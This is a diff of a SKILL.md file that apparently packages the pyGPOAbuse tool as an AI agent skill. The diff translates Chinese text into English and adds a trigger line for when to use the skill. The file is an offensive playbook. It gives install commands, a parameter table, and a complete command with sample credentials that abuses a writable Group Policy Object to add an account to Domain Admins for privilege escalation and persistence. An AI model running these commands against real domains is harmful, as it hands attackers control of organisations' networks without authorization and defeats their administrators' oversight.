@@ -2,38 +2,39 @@
 name: pygpoabuse-gpo-privesc
 description: "pyGPOAbuse: Escalates writable GPOs to Domain Admin. Signals: AD attack, domain penetration, list GPO details, add user to group, abuse writable GPO for privilege escalation."
 zh-signals: "pyGPOAbuse: 可写 GPO 提权到域管。信号:ad攻击,域渗透,列出 GPO 详情,把用户加进组,滥用可写 GPO 提权。"
+when-to-use: "Use when a domain user can write to a Group Policy Object and you want to escalate privileges or persist by adding an account to a privileged group. Requires valid domain credentials and the GPO distinguished name."
 ---
 
 # pyGPOAbuse
 
-- 攻击大类:C30 AD与横向移动
-- 上游仓库:https://github.com/Hackndo/pyGPOAbuse
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C30 AD and Lateral Movement
+- Upstream Repository: https://github.com/Hackndo/pyGPOAbuse
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/Hackndo/pyGPOAbuse && cd pyGPOAbuse && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python3 pygpoabuse DOMAIN/user -gpcname 'CN={GPO},CN=Policies,CN=System,DC=x'` | 列出 GPO 详情 |
-| `-useraccount bob -addusertogroup 'CN=Admins,DC=x'` | 把用户加进组 |
-| `-vuln -useraccount bob -addusertogroup 'CN=Admins,DC=corp,DC=local'` | 滥用可写 GPO 提权 |
-| `-critical` | 标记关键组 |
+| `python3 pygpoabuse DOMAIN/user -gpcname 'CN={GPO},CN=Policies,CN=System,DC=x'` | List GPO details |
+| `-useraccount bob -addusertogroup 'CN=Admins,DC=x'` | Add the user to a group |
+| `-vuln -useraccount bob -addusertogroup 'CN=Admins,DC=corp,DC=local'` | Abuse the writable GPO for privilege escalation |
+| `-critical` | Flag critical groups |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 可写 GPO 提权到域管
+### Escalate a writable GPO to Domain Admin
 
 ```bash
 python3 pygpoabuse CORP/svc -password 'Pass1' -gpcname 'CN={12345678-ABCD},CN=Policies,CN=System,DC=corp,DC=local' -vuln -useraccount svc -addusertogroup 'CN=Domain Admins,CN=Users,DC=corp,DC=local'
-# 等 5-15 分钟组策略刷新生效,svc 进 Domain Admins
+# Wait 5-15 minutes for Group Policy refresh, then svc is in Domain Admins
 ```
 
-## 注意事项
+## Notes
 
-对当前用户可写的 GPO 直接写入组策略实现提权/持久化,无需域管权限。
+Writes Group Policy directly into a GPO writable by the current user to achieve privilege escalation/persistence, no Domain Admin rights needed.
